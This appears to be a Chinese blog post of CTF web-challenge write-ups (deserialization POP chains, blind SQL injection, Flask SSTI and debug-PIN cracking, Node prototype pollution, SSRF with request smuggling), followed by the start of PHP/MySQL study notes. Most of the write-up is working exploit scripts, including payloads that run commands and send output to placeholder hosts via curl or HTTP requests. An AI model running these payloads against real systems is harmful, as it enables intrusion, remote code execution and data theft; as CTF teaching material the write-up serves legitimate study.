babyphp改自[0ctf 2016] piapiapia, 具体的思路是反序列化逃逸和pop链构造 首先是反序列化逃逸 1234function safe($parm)&#123; $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\"); return str_replace($array,'hacker',$parm);&#125; 具体的分析可以找原题看一下, 反序列化逃逸有这两种方向 替换后变长, 在value的部分构造逃逸, 如本题和piapiapia 替换后变短, 在key的部分构造, 如[axb 2019]easy_serialize_php 然后就是反序列化链的构造 nickname可控, 然后寻找__destruct 有个echo, 可以用来触发__toString, 其实本题还有一个__destruct, 但是比较坑 首先存在过滤flag, 无法读取flag.php, 其次没有输出点, 读了也没用 我们继续找找__toString 会调用一个update函数, 对于函数调用我们有两种处理方法 寻找带有这个函数的类 寻找__call方法 因为这个update还是空的 我们就找__call 有个login的调用, 这个就是我们想要的了, 看一下这个函数 sql用的是PDO方法, 一般没有sql注入, 但是这里会返回一个$idResult, 也就是第一列的结果, 而前面的调用还有个echo, 也就是能够回显第一列的结果, 我们就可以利用这个来注出密码 exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpfunction safe($parm)&#123; $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\"); return str_replace($array,'hacker',$parm);&#125;class User&#123; public $id; public $age='select password,password from user where username!=?'; public $nickname=null;&#125;class Info&#123; public $age; public $nickname = \"a\"; public $CtrlCase; &#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql;&#125;class dbCtrl&#123; public $hostname=\"127.0.0.1\"; public $dbuser=\"noob123\"; public $dbpass=\"noob123\"; public $database=\"noob123\"; public $name='1'; public $password=2; public $mysqli; public $token=\"admin\";&#125;$o = new dbCtrl();$i = new Info();$i-&gt;CtrlCase = $o;$u = new User();$u-&gt;nickname = $i;$h = new UpdateHelper();$h-&gt;sql = $u;$f = new Info();$f-&gt;CtrlCase = $h;$s = serialize($f);assert($s===safe($s));$s = substr($s,47);$len = strlen($s);$res = \"\";for($dd=0;$dd&lt;$len;$dd++)&#123; $res.=\"union\";&#125;$res.=$s;file_put_contents(\"out.txt\", $res); 密码 解密后是 1yingyingying 登录就看到flag了 ezupload传马getshell一气呵成 盲注1234567891011121314151617&lt;?php # flag在fl4g里 include 'waf.php'; header(\"Content-type: text/html; charset=utf-8\"); $db = new mysql(); $id = $_GET['id']; if ($id) &#123; if(check_sql($id))&#123; exit(); &#125; else &#123; $sql = \"select * from flllllllag where id=$id\"; $db-&gt;query($sql); &#125; &#125; highlight_file(__FILE__); 过滤了一部分字符, 手测了一下 主要过滤的是 1select, union, =, &gt;, &lt; 一直以为这个fl4g是另外一个表, 研究了很久的姿势如何在没有select的情况下注入其他表, 后面才发现这个可能是个全局变量… 后面就是一般的盲注手法了 123456789101112131415161718192021222324import requestsimport stringurl = \"http://bfc4946ac3554e7bb5e1d801c886b92d69a90297d36e47be.changame.ichunqiu.com/\"proxies = &#123; \"http\": \"127.0.0.1:8080\"&#125;words = string.ascii_lowercase + \"-&#123;&#125;\"def exp(): payload = \"if(ascii(substr(fl4g,%d,1))^%d,0,sleep(5))\" res = \"\" for i in range(1, 45): for j in words: try: params = &#123; \"id\": payload % (i,j) &#125; text = requests.get(url, params=params, timeout=2).text except: res += chr(j) print(res)if __name__ == \"__main__\": exp() easy_sqli_copy123456789101112131415161718192021222324252627282930313233343536373839&lt;?php function check($str) &#123; if(preg_match('/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&amp;|database/i',$str,$matches)) &#123; print_r($matches); return 0; &#125; else &#123; return 1; &#125; &#125; try &#123; $db = new PDO('mysql:host=localhost;dbname=pdotest','root','******'); &#125; catch(Exception $e) &#123; echo $e-&gt;getMessage(); &#125; if(isset($_GET['id'])) &#123; $id = $_GET['id']; &#125; else &#123; $test = $db-&gt;query(\"select balabala from table1\"); $res = $test-&gt;fetch(PDO::FETCH_ASSOC); $id = $res['balabala']; &#125; if(check($id)) &#123; $query = \"select balabala from table1 where 1=?\"; $db-&gt;query(\"set names gbk\"); $row = $db-&gt;prepare($query); $row-&gt;bindParam(1,$id); $row-&gt;execute(); &#125; 盲注, exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsfrom Crypto.Util.number import long_to_bytes, bytes_to_longfrom libnum import s2nimport stringimport reurl = \"http://e0bac4dbfc61452b906f16cacbe31e9bfe43db0e990f4ace.changame.ichunqiu.com/\"pattern = re.compile(\"union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&amp;|database\", re.I)def gen(payload, pos, num): \"\"\" SET @SQL=0x73656c65637420646174616261736528293b;PREPARE pord FROM @SQL;EXECUTE pord;\"\"\" res = \"%bf%27;SET @x=\" + (hex(s2n(payload % (pos, num)))) + \";PREPARE xx FROM @x;EXECUTE xx;/*\" # print(res) if pattern.match(res): print(\"match\") exit(0) return resdef exp(): # payload = \"select if((ascii(substr(reverse((select group_concat(table_name) from information_schema.tables where table_schema=database())),%d,1))&gt;%d),0,sleep(4));\" payload = \"select if((ascii(substr(reverse((select fllllll4g from pdotest.table1)),%d,1))&gt;%d),0,sleep(4));\" res = \"\" for i in range(1,60): start = 32 end = 128 mid = (end + start) // 2 while end &gt; start: params = &#123; \"id\": gen(payload, i, mid) &#125; try: requests.get(url+\"?id=\"+params['id'], timeout=2) start = mid + 1 except: end = mid mid = (end + start) // 2 res = chr(mid) + res print(res) # print(f\"&#123;i&#125;: &#123;res&#125;\") if __name__ == \"__main__\": exp() 改进了一个多线程版本, 一分钟不到就可以注出结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsfrom libnum import s2nimport stringimport refrom multiprocessing.pool import ThreadPoolurl = \"http://e0bac4dbfc61452b906f16cacbe31e9bfe43db0e990f4ace.changame.ichunqiu.com/\"pattern = re.compile(\"union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&amp;|database\", re.I)res = [\"\" for i in range(60)]def gen(payload, pos, num): \"\"\" SET @SQL=0x73656c65637420646174616261736528293b;PREPARE pord FROM @SQL;EXECUTE pord;\"\"\" res = \"%bf%27;SET @x=\" + (hex(s2n(payload % (pos, num)))) + \";PREPARE xx FROM @x;EXECUTE xx;/*\" # print(res) if pattern.match(res): print(\"match\") exit(0) return resdef exp(i): # payload = \"select if((ascii(substr(reverse((select group_concat(table_name) from information_schema.tables where table_schema=database())),%d,1))&gt;%d),0,sleep(4));\" payload = \"select if((ascii(substr(((select fllllll4g from pdotest.table1)),%d,1))&gt;%d),0,sleep(4));\" # for i in range(1,60): if i: start = 32 end = 128 mid = (end + start) // 2 while end &gt; start: params = &#123; \"id\": gen(payload, i, mid) &#125; try: requests.get(url+\"?id=\"+params['id'], timeout=2) start = mid + 1 except: end = mid mid = (end + start) // 2 res[i] = chr(mid) print(\"\".join(res)) # print(f\"&#123;i&#125;: &#123;res&#125;\") if __name__ == \"__main__\": pool = ThreadPool(5) for i in range(45): pool.apply_async(exp, (i, )) # exp() pool.close() pool.join() black_listhttps://skysec.top/2019/12/13/2019-FudanCTF-Writeup/ 飘零师傅tql ezsqli这道题过滤了很多东西, 主要参考的是出题人的博客 https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/ 由于我们没有union, 无法使用常规的无列名注入, 找了很多资料, 只有smi1e师傅的这个payload可用 1234567891011121314151617mysql&gt; SELECT * FROM USERS WHERE ID =1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 123 | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; SELECT * FROM USERS WHERE ID = ((select 1,123,&apos;Dumb&apos;) &lt;= (select * from users limit 1));+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 123 | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; SELECT * FROM USERS WHERE ID = ((select 2,123,&apos;Dumb&apos;) &lt;= (select * from users limit 1));Empty set (0.00 sec) 通过字符串比较的方式来盲注数据库内容, 只要保证我们的输入和另外一个表的列数相同即可 而smi1e师傅后面提出的使用二进制字符串比较来判断大小写的方法, 在这次比赛中其实可以不用, 因为uuid生成的字符串都是小写的, 我们获取后转换即可 首先获取表名, 使用的是 1sys.schema_table_statistics_with_buffer 这个表, 就可以看到表名 注入的话有两个payload 1((select 1,concat(&apos;%s~&apos;,cast(&apos;0&apos; as json)))&lt;(select * from `f1ag_1s_h3r3_hhhhh`))+1 或者 1((select 1,%s)&lt;(select * from `f1ag_1s_h3r3_hhhhh`))+1 自行取舍即可 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import requestsfrom libnum import s2nimport stringurl = \"http://256316c4db254f85a34ea7e5e0f076ffc0fa0637c924448c.changame.ichunqiu.com/\"def exp(): # payload = \"0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer),%d,1))&gt;%d)\" payload = '''((select 1,concat('%s~',cast('0' as json)))&lt;(select * from `f1ag_1s_h3r3_hhhhh`))+1''' # payload = '''((select 1,%s)&lt;(select * from `f1ag_1s_h3r3_hhhhh`))+1''' res = \"\" for i in range(45): for j in \"-\" + string.digits + string.ascii_letters + \"&#123;&#125;\": data = &#123; \"id\": payload % (res + j) &#125; try: text = requests.post(url,data=data, timeout=3).text except TimeoutError: print(\"timeout\") if \"hacker\" in text: print(\"Error\") exit(0) if \"Nu1L\" in text: break res += j print(res)def exp2(): # payload = \"0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer),%d,1))&gt;%d)\" payload = '''((select 1,%s)&lt;(select * from `f1ag_1s_h3r3_hhhhh`))+1''' res = \"\" for i in range(45): end = 127 start = 32 mid = (end + start) // 2 while end &gt; start: data = &#123; \"id\": payload % (hex(s2n(res + chr(mid)))) &#125; try: text = requests.post(url,data=data, timeout=3).text except TimeoutError: print(\"timeout\") if \"hacker\" in text: print(\"Error\") exit(0) if \"Nu1L\" in text: end = mid else: start = mid + 1 mid = (end + start) // 2 res += chr(mid - 1) print(res) if __name__ == \"__main__\": exp2() flaskapp这道题有多种做法, 具体可以参考 https://www.anquanke.com/post/id/197602 命令执行1ls /&gt; /tmp/test 这样的方法来获取命令结果, 对于过滤的地方可以使用 1l\\s 对于多行内容也可以使用 1ls |bas\\e64 来转码输出, 然后弹到远程接收之类都可以 或者在字符串里面使用拼接 1&apos;cat fl&apos;+&apos;ag&apos; 这样, 绕过的方式很多, 给出一个命令执行的payload 1payload = &quot;&#123;% if [].__class__.__base__.__subclasses__()[127].__init__.__globals__[&apos;sys&apos;+&apos;tem&apos;](&apos;curl http://ip:9000/`ls`&apos;) %&#125;2&#123;% endif %&#125;&quot; 顺带一提, 当时ls后的结果不全, 不知道是否有截断, 可以使用 1ls -r 反序输出 debug界面使用pin码getshell根据上面安全客的文章, 但是一直没算对, 脚本如下, 主要的点在于 获取machineid的地方发生了更新, 这里应该使用 读文件的payload如下 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;filename&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 先获取需要的几个参数, 然后再计算一下, 就可以getshell了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import requestsfrom base64 import b64encodeurl = \"http://182.92.243.154:10002/\"payload = \"&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\"def calc(username='flaskweb', modname='flask.app', appname='Flask', filepath='', netid='2485377957892', machineid='81ef01dec0f0eb6d6c0f3752b487b10e'): import hashlib from itertools import chain probably_public_bits = [ username,# username modname,# modname appname,# getattr(app, '__name__', getattr(app.__class__, '__name__')) filepath # getattr(mod, '__file__', None), ] private_bits = [ netid,# str(uuid.getnode()), /sys/class/net/ens33/address machineid# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num return rvdef getnet(): file = \"/sys/class/net/eth0/address\" data = &#123; \"text\":b64encode(payload.replace(\"filename\", file).encode()) &#125; res = requests.post(f\"&#123;url&#125;decode\", data=data).text import re res = re.findall(\"结果.+\", res)[0][-17:] return add2str(res)def getmachine(): file = \"/proc/self/cgroup\" data = &#123; \"text\":b64encode(payload.replace(\"filename\", file).encode()) &#125; res = requests.post(f\"&#123;url&#125;decode\", data=data).text import re res = re.findall(\"结果.+\", res)[0][22:] return resdef readfile(name): data = &#123; \"text\":b64encode(payload.replace(\"filename\", name).encode()) &#125; res = requests.post(f\"&#123;url&#125;decode\", data=data).text import re # res = re.findall(\"结果.+\", res, re.MULTILINE) print(res) print(b64encode(payload.replace(\"filename\", name).encode()))def add2str(address): return str(int(address.replace(\":\",\"\"), 16))if __name__ == \"__main__\": netid = getnet() machineid = getmachine() username = \"flaskweb\" modname = \"flask.app\" appname = \"Flask\" filepath = \"/usr/local/lib/python3.7/site-packages/flask/app.py\" print(calc(username=username, netid=netid, machineid=machineid, appname=appname, filepath=filepath,modname=modname)) # readfile(\"/proc/self/cgroup\") 比赛后成功了, 发现是我传参传少了… ezexpress先读一下源码, 发现有两个函数 原型链污染无疑, 具体的原理可以去看p神的文章 https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html 简单解释一下就是, 先构造一个对象, 使得他的原型中某个属性为需要注入的值, 这里为hack 1var b.__proto__.exp = hack 而由于js原型链的问题, 如果对b和{}执行了merge, 也就是上面clone函数做的事, 就会使得 1&#123;&#125;.exp = hack 从而给{}注入了一个exp属性 而这里的注入点也比较明显, 可以看 /info可以输出一个值, 而/action则是对我们post的内容调用了clone, 那么我们就可以进行注入, 不过需要先绕过一个ADMIN的检测 这里会有一个toUpperCase(), 很快就联想到p神的一篇文章 https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 通过特殊字符来绕过 1ADMıN 大写后为 1ADMIN 然后就可以顺利发包了, 需要注意如果要使得我们的包被json解析, 需要设置header为 1&apos;Content-Type&apos;: &apos;application/json&apos; 然后就是RCE了, 我选择发到服务器上接受 exp如下 1234567891011121314151617181920212223242526272829import requestsimport jsonurl = \"http://123.57.212.112:60072/\"headers = &#123; 'Content-Type': 'application/json'&#125;data = &#123; '__proto__': &#123; 'outputFunctionName': \"test\\nvar require = global.require || global.process.mainModule.constructor._load;\" \"var result = require('child_process').execSync('cat /flag');\" \"var req = require('http').request(`http://x.x.x.x:2333/?$&#123;result&#125;`);\" \"req.end();\\n//\" &#125;&#125;session = requests.Session()def attack(): login_data = &#123; \"userid\": \"ADMıN\", \"pwd\": \"admin\", \"action\": \"login\", \"Submit\": \"register\" &#125; session.post(f\"&#123;url&#125;login\", data=login_data) session.post(f\"&#123;url&#125;action\", data=json.dumps(data), headers=headers) res = session.get(f\"&#123;url&#125;info\").textif __name__ == \"__main__\": attack() easy_thinking看到tp框架, 首先测一下版本, 随便使得路由出错即可 这个版本的话目前只有6.0.1的一个利用session的rce, 然后在www.zip找到了源码, 看一下版本 这里表面上是6.0.2, 其实实际上还是6.0.1, 因为那个洞没修hhh 如果是6.0.2的话多一个检测, 明白了漏洞就找一下注入点, 主要代码在这里 大概就是会把我们搜索的内容写到session里面, 然后根据session可控文件名的漏洞, 就可以传马了, 后面则是突破disable_function的一般操作, 网上很多了, 可以直接用蚁剑或者是别人写好的脚本 nodegame这道题比较有意思, 先看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug');var morgan = require('morgan');const multer = require('multer');app.use(multer(&#123;dest: './dist'&#125;).array('file'));app.use(morgan('short'));app.use(\"/uploads\",express.static(path.join(__dirname, '/uploads')))app.use(\"/template\",express.static(path.join(__dirname, '/template')))app.get('/', function(req, res) &#123; var action = req.query.action?req.query.action:\"index\"; if( action.includes(\"/\") || action.includes(\"\\\\\") )&#123; res.send(\"Errrrr, You have been Blocked\"); &#125; file = path.join(__dirname + '/template/'+ action +'.pug'); var html = pug.renderFile(file); res.send(html);&#125;);app.post('/file_upload', function(req, res)&#123; var ip = req.connection.remoteAddress; var obj = &#123; msg: '', &#125; if (!ip.includes('127.0.0.1')) &#123; obj.msg=\"only admin's ip can use it\" res.send(JSON.stringify(obj)); return &#125; fs.readFile(req.files[0].path, function(err, data)&#123; console.log(\"try to upload\"); if(err)&#123; obj.msg = 'upload failed'; res.send(JSON.stringify(obj)); &#125;else&#123; var file_path = '/uploads/' + req.files[0].mimetype +\"/\"; console.log(file_path); var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path))&#123; try &#123; fs.mkdirSync(__dirname + file_path) &#125; catch (error) &#123; obj.msg = \"file type error\"; res.send(JSON.stringify(obj)); return &#125; &#125; try &#123; fs.writeFileSync(dir_file,data) obj = &#123; msg: 'upload success', filename: file_path + file_name &#125; &#125; catch (error) &#123; obj.msg = 'upload failed'; &#125; res.send(JSON.stringify(obj)); &#125; &#125;)&#125;)app.get('/source', function(req, res) &#123; res.sendFile(path.join(__dirname + '/template/source.txt'));&#125;);app.get('/core', function(req, res) &#123; var q = req.query.q; var resp = \"\"; if (q) &#123; var url = 'http://localhost:8081/source?' + q console.log(url) var trigger = blacklist(url); if (trigger === true) &#123; res.send(\"&lt;p&gt;error occurs!&lt;/p&gt;\"); &#125; else &#123; try &#123; http.get(url, function(resp) &#123; resp.setEncoding('utf8'); resp.on('error', function(err) &#123; if (err.code === \"ECONNRESET\") &#123; console.log(\"Timeout occurs\"); return; &#125; &#125;); resp.on('data', function(chunk) &#123; try &#123; resps = chunk.toString(); res.send(resps); &#125;catch (e) &#123; res.send(e.message); &#125; &#125;).on('error', (e) =&gt; &#123; res.send(e.message);&#125;); &#125;); &#125; catch (error) &#123; console.log(error); &#125; &#125; &#125; else &#123; res.send(\"search param 'q' missing!\"); &#125;&#125;)function blacklist(url) &#123; var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125;var server = app.listen(8081, function() &#123; var host = server.address().address var port = server.address().port console.log(\"Example app listening at http://%s:%s\", host, port)&#125;) 考点是ssrf, 而这里利用的是 https://xz.aliyun.com/t/2894 在nodejs8.12.0这个版本中, 程序在底层处理的时候会舍弃高位的字符, 只保留低位的字符, 也就是说 假如我们传入 1chr(0xffa0) 处理后会被截断为 1chr(0xa0) 那么我们就可以利用这个特点来进行编码绕过, 方法如下 12def exp_code(word): return quote(''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in word)) 其中的0xff可以随意设定, 不会影响结果 然后再利用http走私攻击, 向程序发送两个请求, 这里在构造数据包的时候需要将\\n替换为\\r\\n, 否则将无法识别为正常的请求包 1payload.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;) 接着我们就可以构造请求类似这样 12345678910111213141516171819202122 HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: xContent-Length: 193Origin: http://123.57.212.112:33322Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL3EANY7czeEB7XdWConnection: keep-alive------WebKitFormBoundaryL3EANY7czeEB7XdWContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;cjm22n.pug&quot;Content-Type: text/javascriptbaaaaaa------WebKitFormBoundaryL3EANY7czeEB7XdW--GET /flag HTTP/1.1Host: xConnection: closex: 大概这样的请求来进行绕过, 再看程序上传的流程 文件目录在 1/upload/minetype/ 如果我们使得minetype为 1../template 就可以将文件写入模板目录中, 再通过 这里进行任意访问, 首先需要rce, 我们可以通过pug模板的 1- global.process.mainModule.require(&apos;child_process&apos;).execSync(&apos;evalcmd&apos;) 来执行命令, 编写exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsfrom urllib.parse import quoteurl = \"http://182.92.243.154:33323/\"def upload(cmd): payload = ''' HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: xContent-Length: 304Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBOpB7RbAKnIckY80Connection: keep-alive------WebKitFormBoundaryBOpB7RbAKnIckY80Content-Disposition: form-data; name=\"file\"; filename=\"cjm00n.pug\"Content-Type: ../template- global.process.mainModule.require('child_process').execSync('curl http://ip:port/ -X POST -d `evalcmd`')------WebKitFormBoundaryBOpB7RbAKnIckY80--GET /flag HTTP/1.1Host: xConnection: closex: ''' payload = payload.replace(\"\\n\", \"\\r\\n\").replace(\"evalcmd\", cmd).replace(\"304\", str(297 + len(cmd))) payload = ''.join(chr(int('0xee' + hex(ord(c))[2:].zfill(2), 16)) for c in payload) params = &#123; \"q\": payload &#125; requests.get(f\"&#123;url&#125;core\", params=params,) try: requests.get(f\"&#123;url&#125;?action=cjm00n\", timeout=2) except: print(\"done\") # print(res)def exp_code(word): return quote(''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in word))if __name__ == \"__main__\": upload(\"cat /flag.txt\") # print(exp_code(\"`\")) 使用的时候替换一下ip和port, 以及重新计算一下Content-Length","link":"/2020/02/24/icq新春公益赛wp/"},{"title":"php和mysql开发笔记","text":"学习php圣经&lt;php和mysql Web开发&gt;的笔记 第一章 快速入门php两种标记123&lt;?php ... ?&gt;// 取决于php.ini中'short_open_tag'选项, 默认不开启&lt;? ... ?&gt; 双引号和单引号中的变量单引号不解析php变量, 双引号则会解析变量值 12345$a = 1;echo \"a=$a\";//&gt; a=1;echo 'a=$a';//&gt; a=$a heredoc语法通过标志(theEnd)来作为关闭标记, 只需要保证不会出现在文本中 123456789echo &lt;&lt;&lt;theEnd line 1 line 2 line 3theEnd;//&gt; line 1 line 2 line 3 php变量语法 区分大小写, 不同于函数名 可以与函数名相同 (函数则不可以与另一个函数名相同) 不需要先声明 声明常量常量引用时不需要$ 123define(\"PI\", 3.14)echo PI;//&gt; 3.14 引用引用不是指针, 而是别名, 此时$a和$b都指向了内存中的相同地址 1234567$a = 5;$b = &amp;$a;$a = 7;// a = b = 7//此时unset a不会改变$b的值unset($a);//b = 7;a = undefined 操作符优先级and or xor优先级比&amp;&amp; ||低 类型判断函数gettype可以用于返回类型的字符串形式, settype用于设置类型 123456$a = 1;echo gettype($a);//&gt; intsettype($a, 'float');echo gettype($a);//&gt; float 第二章 数据存储和读取文件读写读写模式 模式 模式名称 意义 r 读 从头开始读, 加上+表示读写 w 写 不存在文件时会创建文件, 存在时则会清空并从头开始写, 加上+表示读写 x 谨慎写 如果文件不存在则会返回false并抛出错误, 其他同w b 二进制 win会区分二进制文件和文本文件, linux则不会区分, 推荐使用 a 追加 不存在文件时会创建文件, 存在时则从文件尾部开始写, 加上+表示读写 t 文本 win下的一个选项, 不推荐使用 分隔符1234//winfopen(\"c:\\\\flag\",\"r\");//win and linux, 推荐fopen(\"../flag\",\"r\"); 写文件12345$fp = fopen(\"log.txt\", \"ab\");fwrite($fp, \"aaa\");file_put_contents(\"log.txt\", \"aaa\");fputs($fp, \"aaa\");fclose($fp); 读文件123456789101112131415161718// 判断文件末尾, file end of filewhile(!feof($fp))&#123;...&#125;;// 读字符while(!feof($fp))&#123; $char = fgetc($fp); if(!feof($fp))&#123; echo ($char == \"\\n\" ? \"&lt;br/&gt;\":$char); &#125;&#125;// 读一行fgets/fgetss/fgetcsv// 读任意长fread()// 读文件readfile($filename);fpassthru($fp);file($filename);//返回数组, 按行分割file_get_contents($filename);//返回文件内容, 不输出 其他文件操作12345678910// 判断文件存在file_exists($filename);// 获取文件大小filesize($filename);// 删除文件unlink($filename);// 文件指针定位rewind()/fseek()/ftell();// 文件锁flock(); 第三章 数组创建数组数组支持在结尾添加元素 12345678910// array$pro = array(&apos;Tires&apos;, &apos;Oil&apos;, &apos;Spark&apos;);$pro = array(&apos;Tires&apos; =&gt; 100, &apos;key&apos; =&gt; value);// since php5.4$pro = [&apos;Tires&apos;, &apos;Oil&apos;, &apos;Spark&apos;];$pro[3] = &apos;Plugs&apos;;// 多维数组$multi_pro = array(array(&apos;tires&apos;, 100), array(&apos;Spark&apos;, 99) ); 访问数组12$pro[0];$pro&#123;1&#125;; 循环123for($i = 0; $i &lt; 3; $i++)&#123;..&#125;foreach($pro =&gt; $value)&#123;...&#125; //foreach($pro as $key =&gt; $value)&#123;...&#125; // 数组排序123456789101112// 字典序,区分大小写sort()asort() ksort()// 反序rsort()arsort() krsort()// 自定义序usort($array, $func)// 数组随机shuffle()// 数组逆序array_reverse() 数组操作进出数组12array_push($array, $item);array_pop($array);//删除末尾 数组浏览123456789101112// 返回当前元素并指向下一个元素each()// 指向下一个元素并返回新的元素next()// 返回当前元素current()// 返回指向第一个元素的指针reset// 返回指向最后一个元素的指针end()// 指向上一个元素并返回新的元素prev() 统计数组1234// 返回元素个数count()/sizeof()// 返回每个特定值在数组中出现的次数, 返回值为数组array_count_values() 其他操作1234567// maparray_walk($array, $func, [userdata]);// 其中func定义为func($value, $key, $userdata); // 解析数组为变量, 不安全extract($array); 第四章 字符串字符串截断123456// 除去开始和结束的空格trim()// 除去开始的空格ltrim()// 除去结束的空格rtrim()/chop() html转换1234// html字符过滤htmlspecialchars();// /n =&gt; &lt;br/&gt;n2br(); 大小写123456strtoupper()strtolower();// 每个字符串首字母大写ucfirst();// 每个单词首字母大写ucwords() 格式化输出1%[+][&apos;padding_character][-][width][.precision]type + 表示正数输出 + padding_character 表示输出前缀, 除0和外都需要添加` -表示左对齐 width表示宽度 .precision表示小数点后位数 类型 意义 b 解释为整数并作为二进制输出 c 解释为整数并作为字符输出 d 解释为整数并作为小数输出 e 解释为双精度并以科学计数法打印, 精度是小数点后的数字个数 E 同e, 打印为大写E f 解释为双精度并作为浮点数输出 F 解释为浮点数并打印与locale无关的浮点数 g 转换规范类型e或f的简短输出 G 转换规范类型E或F的简短输出 o 解释为整数并作为8进制输出 s 解释为字符串输出 u 解释为整数并作为非指定小数输出 x 解释为整数并作为16进制小写输出 X 解释为整数并作为16进制大写输出 字符串连接切分1234// 切分explode($separator, $string);// 连接implode($separator, $array)/join(); 子串1234// strtok// start和length都可以是负数, 当length为负数时表示结束位置(end)substr($strings, start, [length]); 比较123456// 区分大小写strcmp()// 不区分大小写strcasecmp()// 自然序, 2&lt;12strnatcmp() 查找strpos函数如果不存在会返回false, 在弱类型比较中等同于0, 建议使用===作比较 12345678910// 查找子串, 返回从第一次子串出现到结束strstr($string, $substring)/strchr();// 忽略大小写stristr($string, $substring);// 返回最后一次匹配strrchr($string, $substring);// 查找, 返回第一次匹配位置strpos($string, $substring, [$offset]);// 返回最后一次匹配strrpos($string, $substring, [$offset]); 替换12str_replace($old, $new, $string);substr_replace($string, $new, $start, [$length]); 回溯引用模式的回溯引用通过一个反斜杠\\加一个数字或多个来表示, 用来匹配多次出现在一个字符串中的相同子表达式 12345/^([a-z]+) \\1 black sheep/$a = \"baa baa black sheep\";//&gt; 匹配$b = \"blah baa black sheep\";//&gt; 不匹配 正则分割1234print_r(preg_split(\"/\\.|@/\", \"user@admin.cn\"));//&gt; user admin cn 第五章 代码重用和函数auto_prepend_file1234567// php.iniauto_prepend_file = &quot;/path/to/header.php&quot;;auto_append_file = &quot;/path/to/footer.php&quot;;// .htaccess, 目录中每次每个文件都要进行处理, 性能较低php_value auto_prepend_file &quot;/path/to/header.php&quot;php_value auto_append_file &quot;/path/to/footer.php&quot;// 考虑安全问题可以使用readfile读入而不会自动解析代码 闭包闭包函数具有对全局作用域变量的访问, 但必须在闭包函数定义中使用use关键字显式定义 第六章 面向对象类属性修饰符默认为public private不可被继承, protected可以被继承 final关键字用于禁止类被继承或者函数被覆盖 不支持多重继承单一继承, 但是可以支持类似java的interface12345678interface Displayable&#123; function display();&#125;class Test implements Displayable&#123; function display()&#123; ... &#125;&#125; 或者使用Trait, 注意Trait会覆盖类继承的同名方法, 而类中自定义的方法可以覆盖Trait的方法123456789trait logger&#123; public function logmessage($message)&#123; ... &#125;&#125;class Test&#123; use logger; // this-&gt;logmessage();&#125; 如果使用了多个同名的Trait, 需要用insteadof声明所使用的函数 灵活的使用标记当程序中需要大段的打印html代码时, 可以使用如下的方法12345&lt;?php if()&#123;...&#125; else&#123; ?&gt; html... &lt;?php &#125; 常量和静态方法常量用const定义, 静态方法用static修饰, 可以在未初始化前调用 魔术方法12345678910// 方法重载__call($method, $p)// 访问不可访问方法时, since php5.3__callStatic()// 实例化还没有被声明的类时可以调用__autoload()// ex:function __autoload($name)&#123; include_once $name.\".php\";&#125; 迭代器和生成器名称空间如果在文件中声明名称空间, 文件的第一行代码必须是名称空间声明 当没有指定完整的名称空间时, 都会认为在当前名称空间, 如果找不到则会在全局名称空间中寻找, 全局名称空间为\\ 123456// 声明名称空间namespace bob\\html\\page;//使用名称空间use bob\\html\\page;// 别名use bob\\html\\page as www; 第七章 错误和异常处理抛出异常在php中, 